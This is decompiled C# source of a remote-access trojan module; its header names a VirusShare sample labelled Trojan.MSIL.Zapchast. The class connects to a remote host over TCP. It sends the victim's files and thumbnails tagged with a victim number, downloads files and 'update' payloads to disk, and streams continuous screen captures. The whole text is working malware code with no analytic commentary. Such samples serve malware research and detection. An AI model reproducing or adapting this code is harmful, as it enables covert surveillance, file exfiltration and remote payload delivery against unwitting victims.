// Decompiled with JetBrains decompiler
// Type: zub.Client_Dateitransfer
// Assembly: zub, Version=1.0.1.5, Culture=neutral, PublicKeyToken=null
// MVID: 48A5438B-11FD-4EEE-88C7-AA931AE92F31
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Zapchast.aaxrn-15afce431f9064b1d75b7e7f83f2d7ad5b9e68621f44a39c75ffd88172493695.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace zub
{
  public class Client_Dateitransfer
  {
    public string IpAdresse;
    public int Port;
    public string VonHier;
    public string NachHier;
    public TcpListener Tcp_Server;
    public TcpClient Tcp_Client;
    public string VictimNummer;
    public int Qualität;
    public int Wartezeit;
    private Thread tthread;

    public Client_Dateitransfer()
    {
      this.Qualität = 400;
      this.Wartezeit = 1000;
    }

    public void DateiSenden() => new Thread(new ThreadStart(this.clientstart_Senden))
    {
      IsBackground = true
    }.Start();

    public void DateiSendenThumb() => new Thread(new ThreadStart(this.clientstart_SendenThumb))
    {
      IsBackground = true
    }.Start();

    public void DateiEmfpangen() => new Thread(new ThreadStart(this.clientstart_Empfangen))
    {
      IsBackground = true
    }.Start();

    public void DateiEmfpangen_update() => new Thread(new ThreadStart(this.clientstart_Empfangen_update))
    {
      IsBackground = true
    }.Start();

    public void ScreenCapp()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.tthread = new Thread(new ThreadStart(this.clientstart_Screen));
label_2:
        num3 = 3;
        this.tthread.IsBackground = true;
label_3:
        num3 = 4;
        this.tthread.Start();
        goto label_10;
label_5:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_10;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_5;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_10:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void ScreenStopp()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.tthread.Abort();
        goto label_8;
label_3:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_8;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientstart_Senden()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.Tcp_Client = new TcpClient();
label_2:
        num3 = 3;
        this.Tcp_Client.Connect(this.IpAdresse, this.Port);
label_3:
        num3 = 4;
        BinaryWriter binaryWriter = new BinaryWriter((Stream) this.Tcp_Client.GetStream());
label_4:
        num3 = 5;
        BinaryReader binaryReader = new BinaryReader((Stream) this.Tcp_Client.GetStream());
label_5:
        num3 = 6;
        Client_Dateitransfer.clienterverParameter parameter = new Client_Dateitransfer.clienterverParameter();
label_6:
        num3 = 7;
        parameter.IpAdresse = this.IpAdresse;
label_7:
        num3 = 8;
        parameter.Port = this.Port;
label_8:
        num3 = 9;
        parameter.reader = binaryReader;
label_9:
        num3 = 10;
        parameter.writer = binaryWriter;
label_10:
        num3 = 11;
        parameter.tcp_c = this.Tcp_Client;
label_11:
        num3 = 12;
        parameter.socketstream = this.Tcp_Client.GetStream();
label_12:
        num3 = 13;
        parameter.tthread = new Thread((ParameterizedThreadStart) (a0 =>
        {
          object obj = a0;
          Client_Dateitransfer.clienterverParameter clienterverParameter;
          this.clientsendet(obj != null ? (Client_Dateitransfer.clienterverParameter) obj : clienterverParameter);
        }));
label_13:
        num3 = 14;
        parameter.tthread.IsBackground = true;
label_14:
        num3 = 15;
        parameter.tthread.Start((object) parameter);
        goto label_21;
label_16:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientstart_SendenThumb()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.Tcp_Client = new TcpClient();
label_2:
        num3 = 3;
        this.Tcp_Client.Connect(this.IpAdresse, this.Port);
label_3:
        num3 = 4;
        BinaryWriter binaryWriter = new BinaryWriter((Stream) this.Tcp_Client.GetStream());
label_4:
        num3 = 5;
        BinaryReader binaryReader = new BinaryReader((Stream) this.Tcp_Client.GetStream());
label_5:
        num3 = 6;
        Client_Dateitransfer.clienterverParameter parameter = new Client_Dateitransfer.clienterverParameter();
label_6:
        num3 = 7;
        parameter.IpAdresse = this.IpAdresse;
label_7:
        num3 = 8;
        parameter.Port = this.Port;
label_8:
        num3 = 9;
        parameter.reader = binaryReader;
label_9:
        num3 = 10;
        parameter.writer = binaryWriter;
label_10:
        num3 = 11;
        parameter.tcp_c = this.Tcp_Client;
label_11:
        num3 = 12;
        parameter.socketstream = this.Tcp_Client.GetStream();
label_12:
        num3 = 13;
        parameter.tthread = new Thread((ParameterizedThreadStart) (a0 =>
        {
          object obj = a0;
          Client_Dateitransfer.clienterverParameter clienterverParameter;
          this.clientsendetThumb(obj != null ? (Client_Dateitransfer.clienterverParameter) obj : clienterverParameter);
        }));
label_13:
        num3 = 14;
        parameter.tthread.IsBackground = true;
label_14:
        num3 = 15;
        parameter.tthread.Start((object) parameter);
        goto label_21;
label_16:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientstart_Empfangen()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.Tcp_Client = new TcpClient();
label_2:
        num3 = 3;
        this.Tcp_Client.Connect(this.IpAdresse, this.Port);
label_3:
        num3 = 4;
        BinaryWriter binaryWriter = new BinaryWriter((Stream) this.Tcp_Client.GetStream());
label_4:
        num3 = 5;
        BinaryReader binaryReader = new BinaryReader((Stream) this.Tcp_Client.GetStream());
label_5:
        num3 = 6;
        Client_Dateitransfer.clienterverParameter parameter = new Client_Dateitransfer.clienterverParameter();
label_6:
        num3 = 7;
        parameter.IpAdresse = this.IpAdresse;
label_7:
        num3 = 8;
        parameter.Port = this.Port;
label_8:
        num3 = 9;
        parameter.reader = binaryReader;
label_9:
        num3 = 10;
        parameter.writer = binaryWriter;
label_10:
        num3 = 11;
        parameter.tcp_c = this.Tcp_Client;
label_11:
        num3 = 12;
        parameter.socketstream = this.Tcp_Client.GetStream();
label_12:
        num3 = 13;
        parameter.tthread = new Thread((ParameterizedThreadStart) (a0 =>
        {
          object obj = a0;
          Client_Dateitransfer.clienterverParameter clienterverParameter;
          this.clientempfängt(obj != null ? (Client_Dateitransfer.clienterverParameter) obj : clienterverParameter);
        }));
label_13:
        num3 = 14;
        parameter.tthread.IsBackground = true;
label_14:
        num3 = 15;
        parameter.tthread.Start((object) parameter);
        goto label_21;
label_16:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientstart_Empfangen_update()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.Tcp_Client = new TcpClient();
label_2:
        num3 = 3;
        this.Tcp_Client.Connect(this.IpAdresse, this.Port);
label_3:
        num3 = 4;
        BinaryWriter binaryWriter = new BinaryWriter((Stream) this.Tcp_Client.GetStream());
label_4:
        num3 = 5;
        BinaryReader binaryReader = new BinaryReader((Stream) this.Tcp_Client.GetStream());
label_5:
        num3 = 6;
        Client_Dateitransfer.clienterverParameter parameter = new Client_Dateitransfer.clienterverParameter();
label_6:
        num3 = 7;
        parameter.IpAdresse = this.IpAdresse;
label_7:
        num3 = 8;
        parameter.Port = this.Port;
label_8:
        num3 = 9;
        parameter.reader = binaryReader;
label_9:
        num3 = 10;
        parameter.writer = binaryWriter;
label_10:
        num3 = 11;
        parameter.tcp_c = this.Tcp_Client;
label_11:
        num3 = 12;
        parameter.socketstream = this.Tcp_Client.GetStream();
label_12:
        num3 = 13;
        parameter.tthread = new Thread((ParameterizedThreadStart) (a0 =>
        {
          object obj = a0;
          Client_Dateitransfer.clienterverParameter clienterverParameter;
          this.clientempfängt_update(obj != null ? (Client_Dateitransfer.clienterverParameter) obj : clienterverParameter);
        }));
label_13:
        num3 = 14;
        parameter.tthread.IsBackground = true;
label_14:
        num3 = 15;
        parameter.tthread.Start((object) parameter);
        goto label_21;
label_16:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientsendet(
      Client_Dateitransfer.clienterverParameter parameter)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
label_2:
        num3 = 3;
        FileStream fileStream = new FileStream(this.VonHier, FileMode.Open);
label_3:
        num3 = 4;
        byte[] numArray = new byte[checked ((int) (fileStream.Length - 1L) + 1)];
label_4:
        num3 = 5;
        fileStream.Read(numArray, 0, numArray.Length);
label_5:
        num3 = 6;
        fileStream.Close();
label_6:
        num3 = 7;
        parameter.writer.Write("SendFile");
label_7:
        num3 = 8;
        parameter.writer.Write(this.VictimNummer);
label_8:
        num3 = 9;
        parameter.writer.Write(this.VonHier);
label_9:
        num3 = 10;
        parameter.writer.Write(this.NachHier);
label_10:
        num3 = 11;
        parameter.writer.Write(numArray.Length);
label_11:
        num3 = 12;
        parameter.writer.Write(numArray);
label_12:
        num3 = 13;
        parameter.writer.Close();
label_13:
        num3 = 14;
        parameter.reader.Close();
label_14:
        num3 = 15;
        parameter.tcp_c.Close();
label_15:
        num3 = 16;
        parameter.socketstream.Close();
label_16:
        num3 = 17;
        parameter.tthread.Abort();
        goto label_23;
label_18:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
              case 19:
                goto label_23;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_18;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_23:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientsendetThumb(
      Client_Dateitransfer.clienterverParameter parameter)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
label_2:
        num3 = 3;
        FileStream fileStream = new FileStream(this.VonHier, FileMode.Open);
label_3:
        num3 = 4;
        byte[] numArray = new byte[checked ((int) (fileStream.Length - 1L) + 1)];
label_4:
        num3 = 5;
        fileStream.Read(numArray, 0, numArray.Length);
label_5:
        num3 = 6;
        fileStream.Close();
label_6:
        num3 = 7;
        parameter.writer.Write("SendFileThumb");
label_7:
        num3 = 8;
        parameter.writer.Write(this.VictimNummer);
label_8:
        num3 = 9;
        parameter.writer.Write(this.VonHier);
label_9:
        num3 = 10;
        parameter.writer.Write(this.NachHier);
label_10:
        num3 = 11;
        parameter.writer.Write(numArray.Length);
label_11:
        num3 = 12;
        parameter.writer.Write(numArray);
label_12:
        num3 = 13;
        parameter.writer.Close();
label_13:
        num3 = 14;
        parameter.reader.Close();
label_14:
        num3 = 15;
        parameter.tcp_c.Close();
label_15:
        num3 = 16;
        parameter.socketstream.Close();
label_16:
        num3 = 17;
        parameter.tthread.Abort();
        goto label_23;
label_18:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
              case 19:
                goto label_23;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_18;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_23:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientempfängt(
      Client_Dateitransfer.clienterverParameter parameter)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        parameter.writer.Write("GetFile");
label_2:
        num3 = 3;
        parameter.writer.Write(this.VictimNummer);
label_3:
        num3 = 4;
        parameter.writer.Write(this.VonHier);
label_4:
        num3 = 5;
        parameter.writer.Write(this.NachHier);
label_5:
        num3 = 6;
        int count = parameter.reader.ReadInt32();
label_6:
        num3 = 7;
        byte[] array = parameter.reader.ReadBytes(count);
label_7:
        num3 = 8;
        FileStream fileStream = new FileStream(this.NachHier, FileMode.Create, FileAccess.Write, FileShare.None);
label_8:
        num3 = 9;
        fileStream.Write(array, 0, count);
label_9:
        num3 = 10;
        fileStream.Close();
label_10:
        num3 = 11;
        parameter.tthread.Abort();
        goto label_17;
label_12:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
              case 13:
                goto label_17;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_17:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientempfängt_update(
      Client_Dateitransfer.clienterverParameter parameter)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        parameter.writer.Write("UpdateFile");
label_2:
        num3 = 3;
        parameter.writer.Write(this.VictimNummer);
label_3:
        num3 = 4;
        parameter.writer.Write(this.VonHier);
label_4:
        num3 = 5;
        parameter.writer.Write(this.NachHier);
label_5:
        num3 = 6;
        int count = parameter.reader.ReadInt32();
label_6:
        num3 = 7;
        byte[] array = parameter.reader.ReadBytes(count);
label_7:
        num3 = 8;
        FileStream fileStream = new FileStream(this.NachHier, FileMode.Create, FileAccess.Write, FileShare.None);
label_8:
        num3 = 9;
        fileStream.Write(array, 0, count);
label_9:
        num3 = 10;
        fileStream.Close();
label_10:
        num3 = 11;
        parameter.tthread.Abort();
        goto label_17;
label_12:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
              case 13:
                goto label_17;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_17:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void clientstart_Screen()
    {
      this.Tcp_Client = new TcpClient();
      this.Tcp_Client.Connect(this.IpAdresse, this.Port);
      BinaryWriter binaryWriter = new BinaryWriter((Stream) this.Tcp_Client.GetStream());
      BinaryReader binaryReader = new BinaryReader((Stream) this.Tcp_Client.GetStream());
      this.Screencap(new Client_Dateitransfer.clienterverParameter()
      {
        IpAdresse = this.IpAdresse,
        Port = this.Port,
        reader = binaryReader,
        writer = binaryWriter,
        tcp_c = this.Tcp_Client,
        socketstream = this.Tcp_Client.GetStream()
      });
    }

    public Bitmap CaptureScreen()
    {
      Bitmap bitmap = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);
      Graphics graphics = Graphics.FromImage((Image) bitmap);
      graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
      graphics.Dispose();
      return bitmap;
    }

    public void JPEGCompression(Image Image, string OutPutFile, int Qualitiy)
    {
      ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
      EncoderParameters encoderParams = new EncoderParameters(1);
      encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long) Qualitiy);
      Image.Save(OutPutFile, imageEncoders[1], encoderParams);
    }

    private void Screencap(
      Client_Dateitransfer.clienterverParameter parameter)
    {
      parameter.writer.Write("Screen");
      while (true)
      {
        byte[] buffer = this.Image2ByteArray((Image) this.PicResizeByWidth((Image) this.CaptureScreen(), this.Qualität), ImageFormat.Png);
        parameter.writer.Write(this.VictimNummer);
        parameter.writer.Write(buffer.Length);
        parameter.writer.Write(buffer);
        Thread.Sleep(this.Wartezeit);
      }
    }

    public Bitmap PicResizeByWidth(Image SourceImage, int NewWidth)
    {
      int int32 = Convert.ToInt32(Decimal.Multiply(new Decimal((double) NewWidth / (double) SourceImage.Width), new Decimal(SourceImage.Height)));
      Bitmap bitmap = new Bitmap(NewWidth, int32);
      using (Graphics graphics = Graphics.FromImage((Image) bitmap))
      {
        graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
        graphics.DrawImage(SourceImage, new Rectangle(0, 0, NewWidth, int32));
      }
      return bitmap;
    }

    public byte[] Image2ByteArray(Image Bild, ImageFormat Bildformat)
    {
      MemoryStream memoryStream = new MemoryStream();
      Bild.Save((Stream) memoryStream, Bildformat);
      memoryStream.Flush();
      return memoryStream.ToArray();
    }

    private struct clienterverParameter
    {
      public string IpAdresse;
      public int Port;
      public TcpClient tcp_c;
      public NetworkStream socketstream;
      public BinaryWriter writer;
      public BinaryReader reader;
      public Thread tthread;
    }
  }
}
